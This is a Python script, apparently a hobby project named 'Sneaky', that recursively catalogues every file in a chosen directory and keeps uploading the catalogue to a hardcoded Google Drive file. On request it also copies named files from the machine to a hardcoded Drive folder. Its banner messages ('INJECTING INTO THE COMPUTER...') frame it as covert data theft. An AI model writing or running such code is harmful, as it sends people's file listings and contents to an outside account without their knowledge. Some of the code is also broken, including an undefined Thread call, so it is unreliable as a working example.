import pandas
import numpy
import time
import webbrowser
import os
import magic
import pandas as pd
import pathlib
import threading
from tabulate import tabulate

from googleapiclient.http import MediaFileUpload
mime = magic.Magic(mime=True)  #To get the mimetype of a file

from Google import create_service   #Drive api thingss
csv_size = 1
CLIENT_SECRET_FILE = 'credentials.json'
API_NAME = 'drive'
API_VERSION = 'v3'
SCOPES = ["https://www.googleapis.com/auth/drive","https://www.googleapis.com/auth/drive.file"]
service = create_service(CLIENT_SECRET_FILE, API_NAME,API_VERSION,SCOPES)
df = pd.DataFrame()

def create_thread():
	return Thread(target=Scanner)


def export_csv_file(file_path: str,):  #Exports the Pandas Dataframe to the Drive
    if not os.path.exists(file_path):
        print(f"File Path not Found")
        return

    media = MediaFileUpload(filename=file_path, mimetype='text/csv')

    file = service.files().update(
        fileId='1KAB81Mauy1rCUJCzhDsxpKLIDiyhv8wRSUjsO0_I1oo',
        media_body=media
    ).execute()
    # print(file)

def upload_file(file_path: str,):   #Files Drive pe upload krne ke liye
    if not os.path.exists(file_path):
        print(f"File Path not Found")
        return
    file_metadata = {
        'name' : os.path.basename(file_path).replace('.csv',''),
        'mimeType' : 'application/vnd.google-apps.spreadsheet'
        }

    media = MediaFileUpload(filename=file_path, mimetype='text/csv')

    file = service.files().create(
        body=file_metadata,
        fileId='1KAB81Mauy1rCUJCzhDsxpKLIDiyhv8wRSUjsO0_I1oo',
        media_body=media
    ).execute()

    # print(file)

def get_size(path):         #get and converts the size of a file into KB/MB/GB
    size = os.path.getsize(path)
    if size < 1024:
        return f"{size} bytes"
    elif size < pow(1024, 2):
        return f"{round(size / 1024, 2)} KB"
    elif size < pow(1024, 3):
        return f"{round(size / (pow(1024, 2)), 2)} MB"
    elif size < pow(1024, 4):
        return f"{round(size / (pow(1024, 3)), 2)} GB"

def scanRecurse(baseDir):       #Recursive function that ensure that all folders within the directories are scanned
    for ent in os.scandir(baseDir):
        if ent.is_file():
            yield ent
        else:
            yield from scanRecurse(ent.path)

def ScanDirectory(directory):       #Scans Directory duh
    while(1):
        global csv_size
        global df
        Filename = []
        Filesize = []
        Filetype = []
        Filecreate = []
        FileExt = []
        FilePath = []
        # print("yoo")
        try:
            for item in scanRecurse(directory):
                Filename.append(item.name)
                Filesize.append(get_size(item.path))
                # Filetype.append(magic.from_file(item.path))
                Filecreate.append(time.ctime(os.path.getctime(item.path)))
                FileExt.append(pathlib.Path(item).suffix)
                FilePath.append(item.path)
            # df = pd.DataFrame()
            # print("hi")
            df["FileName"] = Filename
            df["FileSize"] = Filesize
            df["FileExtension"] = FileExt
            # df["FileType"] = Filetype
            df["FilePath"] = FilePath
            df["Filecreated"] = Filecreate
            df.to_csv('D:\\WOC.csv')
            time.sleep(1)

            sizeofcsv = os.path.getsize('D:\\WOC.csv')
            if not csv_size==sizeofcsv:
                export_csv_file('D:\\WOC.csv')
                csv_size=sizeofcsv
        except Exception as e:
            pass
            print(e)
            # print("Updating Database")
            df = pd.DataFrame()


def PrintDatabase(df):      ##Neatly prints the Database with Borders and shit
    # print("hi")
    print(tabulate(df, headers='keys', tablefmt='psql'))
    # print(df)



print("\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\033[1mWELCOME TO Sneaky\n\033[0m")
print("\t\t\t\t\t\t\t\tIf you do not know, what is this, it is recommended not to continue.\n")
print("\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\033[1mGO AWAY\n\033[0m")
# Scanner = threading.Thread(target=ScanDirectory, args=list(directory.split(" ")))
# Menu = threading.Thread(target=Interface)
# Scanner.daemon = True

cont = input("Press (Y/N).....")
if (cont=="y" or cont=="Y"):


    directory = str(input("Enter the Directory you want to Scan: ")) # Directory jo Scan Krni hai
    Scanner = threading.Thread(target=ScanDirectory, args=list(directory.split("`")))
    print("WELCOME TO SNEAKY")
    time.sleep(1)
    print("INJECTING INTO THE COMPUTER...")
    print("Scanning Files...")
    print("Preparing Database...")
    Scanner.start()
    while(1):
        print("What would you like to do today?")
        print(" 1. Access the database.")
        time.sleep(.5)
        print(" 2. Download the Files.")
        time.sleep(.5)
        print(" 0. Exit")
        time.sleep(.5)
        uploaded = 0
        try:
            choice = int(input("Enter a choice(integer): "))
        except Exception as e:
            pass
            choice=100
            print("Not a valid choice, try again")
        if choice==1:
            PrintDatabase(df)
        elif choice==2:
            whichfile = input("Enter name of the file which you want to download: ")
                # print(whichfile)
            for index,row in df.iterrows():
                # print(row["FileName"])
                if row["FileName"]==whichfile:
                    file_metadata = {
                        'name': row["FileName"],
                        'parent' : '1CF2tY-TtV9gSZmQ8BB_HaB04yPaP9wdq'
                    }
                    media_content = MediaFileUpload(row["FilePath"], mimetype=mime.from_file(row["FilePath"]))
                    service.files().create(
                        body=file_metadata,
                        media_body=media_content
                        ).execute()
                    print("File Downloaded")
                    uploaded = 1
                    break
            if uploaded==0:
                print("file not found")

        elif choice==0:
            exit(0)
else:
    exit(1)
